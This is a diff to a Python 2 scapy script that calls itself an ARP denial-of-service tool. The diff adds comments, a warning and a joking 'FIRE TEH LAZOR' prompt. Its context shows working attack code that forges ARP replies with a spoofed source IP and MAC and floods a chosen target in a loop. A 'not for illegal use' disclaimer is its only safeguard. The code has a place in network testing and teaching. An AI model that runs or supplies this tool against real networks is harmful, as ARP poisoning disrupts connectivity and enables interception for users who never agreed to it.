@@ -1,9 +1,13 @@
 #!/usr/bin/python
+# python+scappy based Arp Denial of Service tool. Not for illegal use...
+# Usage: python2 arpdos -h
 
+# Imports
 from scapy.all import *
 from time import sleep
 import argparse
 
+# Command line parameters
 parser = argparse.ArgumentParser(description='ARM Spoof a target')
 parser.add_argument('-c', '--count',  action="store", dest="count",  default="-1", type=int,      help="Count")
 parser.add_argument('-d', '--delay',  action="store", dest="delay",  default="1000", type=int,    help="Delay")
@@ -14,6 +18,7 @@ parser.add_argument('-o', '--op',     action="store", dest="op",     default="2"
 parser.add_argument('target',         action="store", help="IP to ARM Spoof")
 args = parser.parse_args()
 
+# Setup poisoned ARP packet
 dosA=ARP()
 dosA.op = args.op
 dosA.hwsrc = args.mac
@@ -21,14 +26,17 @@ dosA.hwdst = args.hwdst
 dosA.psrc = args.reject
 dosA.pdst = args.target
 
+# Show information for user to confirm
 dosA.display()
 print "Target:",args.target
 print "Reject:",args.reject
 print "Delay:",args.delay
 print "Count:",args.count
-raw_input("Press ENTER to continue")
+print "WARNING! Can cause harm to network. Make sure you know who your doing this to"
+raw_input("Press ENTER to FIRE TEH LAZOR! (to continue)")
 print
 
+# Send packets
 sent = 0
 try:
     while ( (sent<args.count) or (args.count==-1) ):
@@ -36,6 +44,8 @@ try:
         sent += 1
         print "Sent",sent,"/",args.count
         sleep(args.delay/1000)
+
+# Kill errors
 except:
     print "Error\n"
     pass
